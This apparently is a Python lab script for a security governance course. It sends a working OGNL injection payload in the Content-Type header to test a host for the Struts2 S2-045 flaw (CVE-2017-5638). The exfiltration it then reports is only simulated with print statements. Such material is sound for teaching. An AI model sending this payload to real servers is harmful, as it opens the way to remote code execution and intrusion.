#!/usr/bin/env python3
"""
Attack Simulation Script
Part 2 - GRC102 Security Governance Simulation

Simulates exploitation of the unpatched Struts2 S2-045 vulnerability to
demonstrate what an unmonitored, unpatched, unsegmented environment allows
an attacker to do. Run only against the authorised, isolated lab network.
"""

import os
import json
import datetime
import requests
import time


def simulate_struts_attack():
    target_url = "http://web_server:8080"
    print("Simulating attack on vulnerable Struts application...")

    headers = {
        "Content-Type": "%{#context['com.opensymphony.xwork2.dispatcher."
        "HttpServletResponse'].addHeader('X-Vulnerable','true')}"
        ".multipart/form-data"
    }

    try:
        response = requests.get(target_url, headers=headers, timeout=5)
        if 'X-Vulnerable' in response.headers:
            print("System is vulnerable to Struts S2-045 (CVE-2017-5638)")
            print("Simulating data exfiltration...")
            time.sleep(1)
            print("Simulating access to database...")
            time.sleep(1)
            print("Simulating exfiltration of customer data...")
            time.sleep(1)

            attack_log = {
                "timestamp": datetime.datetime.now().isoformat(),
                "attack_type": "Struts S2-045 Exploitation",
                "target": "web_server",
                "success": True,
                "data_accessed": "customer_data database",
                "records_affected": 3,
            }
            with open("attack_log.json", "w") as f:
                json.dump(attack_log, f, indent=2)

            print("Attack simulation completed. Log saved to attack_log.json")
            return True
        else:
            print("System is not vulnerable to Struts S2-045 (CVE-2017-5638)")
            return False
    except Exception as e:
        print(f"Error simulating attack: {e}")
        return False


def main():
    simulate_struts_attack()


if __name__ == "__main__":
    main()
